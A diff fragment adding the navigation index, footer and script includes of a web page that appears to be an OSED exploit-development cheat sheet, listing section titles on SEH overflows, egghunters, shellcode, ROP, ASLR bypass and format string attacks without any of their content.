+        <a href="#osed-stack-theory">4.1 Theory</a>
+        <a href="#osed-stack-steps">4.2 Step-by-Step</a>
+        <a href="#osed-stack-space">4.3 Shellcode Space</a>
+        <a href="#osed-stack-skeleton">4.4 Exploit Skeleton</a>
+      </div>
+    </div>
+    <div class="section-flow-5">
+      <button class="dropdown-btn">5. Bad Characters &amp; Return Addresses
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-bad-chars-find">5.1 Finding Bad Characters</a>
+        <a href="#osed-return-address">5.2 Finding a Return Address</a>
+        <a href="#osed-module-protections">5.3 Module Protection Flags</a>
+      </div>
+    </div>
+    <div class="section-flow-6">
+      <button class="dropdown-btn">6. SEH Overflows
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-seh-theory">6.1 SEH Theory</a>
+        <a href="#osed-seh-bypass">6.2 Bypassing SafeSEH / SEHOP</a>
+        <a href="#osed-seh-steps">6.3 Exploitation Steps</a>
+        <a href="#osed-seh-island">6.4 Island-Hopping in Assembly</a>
+        <a href="#osed-seh-layout">6.5 Full Exploit Layout</a>
+      </div>
+    </div>
+    <div class="section-flow-7">
+      <button class="dropdown-btn">7. Reverse Engineering
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-ida-interface">7.1 IDA Pro Interface &amp; Basics</a>
+        <a href="#osed-ida-workflow">7.2 IDA Pro Bug-Finding Workflow</a>
+        <a href="#osed-ida-sync">7.3 Sync IDA with WinDbg</a>
+        <a href="#osed-ghidra-overview">7.4 Ghidra Overview</a>
+        <a href="#osed-ghidra-workflow">7.5 Ghidra Workflow &amp; Scripting</a>
+        <a href="#osed-re-protocol">7.6 Protocol RE Workflow</a>
+      </div>
+    </div>
+    <div class="section-flow-8">
+      <button class="dropdown-btn">8. Egghunters &amp; Space Restrictions
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-egg-when">8.1 When to Use an Egghunter</a>
+        <a href="#osed-egg-partial-eip">8.2 Partial EIP Overwrite</a>
+        <a href="#osed-egg-conditional">8.3 Conditional Jumps &amp; Assembly Tricks</a>
+        <a href="#osed-egg-heap">8.4 Heap &amp; Alternative Buffers</a>
+        <a href="#osed-egg-keystone">8.5 NtAccessCheck Egghunter (Keystone)</a>
+        <a href="#osed-egg-seh">8.6 SEH-Based Egghunter (Portable)</a>
+        <a href="#osed-egg-win10">8.7 Porting to Windows 10</a>
+      </div>
+    </div>
+    <div class="section-flow-9">
+      <button class="dropdown-btn">9. Custom Shellcode
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-shellcode-syscall-problem">9.1 The System Call Problem</a>
+        <a href="#osed-peb-walk">9.2 Finding kernel32 via PEB</a>
+        <a href="#osed-eat-resolution">9.3 Resolving Symbols via EAT</a>
+        <a href="#osed-name-hash">9.4 Computing Name Hashes</a>
+        <a href="#osed-null-free-pic">9.5 NULL-Free Position-Independent Code</a>
+        <a href="#osed-revshell-ws2">9.6 Reverse Shell via ws2_32</a>
+      </div>
+    </div>
+    <div class="section-flow-10">
+      <button class="dropdown-btn">10. Bypassing DEP (ROP)
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-dep-theory">10.1 DEP Theory &amp; WDEG</a>
+        <a href="#osed-rop-origins">10.2 ROP Origins &amp; Evolution</a>
+        <a href="#osed-rop-gadget-find">10.3 Gadget Discovery</a>
+        <a href="#osed-rop-virtualalloc">10.4 VirtualAlloc Chain</a>
+        <a href="#osed-rop-wpm">10.5 WriteProcessMemory Alternative</a>
+        <a href="#osed-rop-decoder">10.6 ROP Decoder &amp; Encoding</a>
+      </div>
+    </div>
+    <div class="section-flow-11">
+      <button class="dropdown-btn">11. Bypassing ASLR
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-aslr-theory">11.1 ASLR Theory</a>
+        <a href="#osed-aslr-nonaslr">11.2 Non-ASLR Modules</a>
+        <a href="#osed-aslr-leak">11.3 Information Leaks</a>
+        <a href="#osed-aslr-partial">11.4 Partial Overwrites</a>
+        <a href="#osed-aslr-hidden">11.5 Finding Hidden Gems</a>
+      </div>
+    </div>
+    <div class="section-flow-12">
+      <button class="dropdown-btn">12. Format String Attacks
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#osed-fstr-theory">12.1 Theory</a>
+        <a href="#osed-fstr-specifiers">12.2 Specifier Cheat Sheet</a>
+        <a href="#osed-fstr-leak">12.3 ASLR Bypass via Leak (Part I)</a>
+        <a href="#osed-fstr-write">12.4 Write Primitive with %n (Part II)</a>
+        <a href="#osed-fstr-eip">12.5 Overwriting EIP</a>
+        <a href="#osed-fstr-pivot">12.6 Stack Pivot for ROP</a>
+        <a href="#osed-fstr-rce">12.7 Full Chain</a>
+      </div>
+    </div>
+    <div class="section-flow-13">
+      <button class="dropdown-btn">13. Methodology
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#methodology-preexam">13.1 Pre-Exam Setup</a>
+        <a href="#methodology-recon">13.2 Target Recon &amp; Enumeration</a>
+        <a href="#methodology-reverse">13.3 Reverse Engineering</a>
+        <a href="#methodology-crash">13.4 Crash Triage</a>
+        <a href="#methodology-control">13.5 Gaining EIP / SEH Control</a>
+        <a href="#methodology-badchars">13.6 Bad Character Enumeration</a>
+        <a href="#methodology-return">13.7 Return Address Selection</a>
+        <a href="#methodology-shellcode">13.8 Shellcode Staging</a>
+        <a href="#methodology-dep">13.9 Defeating DEP (ROP)</a>
+        <a href="#methodology-aslr">13.10 Defeating ASLR</a>
+        <a href="#methodology-format-string">13.11 Format String Workflow</a>
+        <a href="#methodology-reliability">13.12 Reliability &amp; Finalization</a>
+        <a href="#methodology-proof">13.13 Proof &amp; Documentation</a>
+      </div>
+    </div>
+    <div class="section-flow-14">
+      <a href="#references">14. References</a>
+    </div>
+  </div>
+  <!-- End Index -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="credits">
+        <p>
+          &copy; Wencheng Xue<br>
+          Penetration Tester &amp; Vulnerability Researcher
+        </p>
+      </div>
+    </div>
+  </footer><!-- End  Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="./vendor/purecounter/purecounter.js"></script>
+  <script src="./vendor/aos/aos.js"></script>
+  <script src="./vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="./vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="./vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="./vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="./vendor/typed.js/typed.min.js"></script>
+  <script src="./vendor/waypoints/noframework.waypoints.js"></script>
+  <script src="./vendor/php-email-form/validate.js"></script>
+
+  <!-- Prism JS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-csharp.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="./js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script src="js/prism-langs.js"></script>
+  
+
+  <script src="js/cheatsheet-index.js"></script>
+
+  <script src="js/methodology-checkboxes.js"></script>
+</body>
+
+</html>
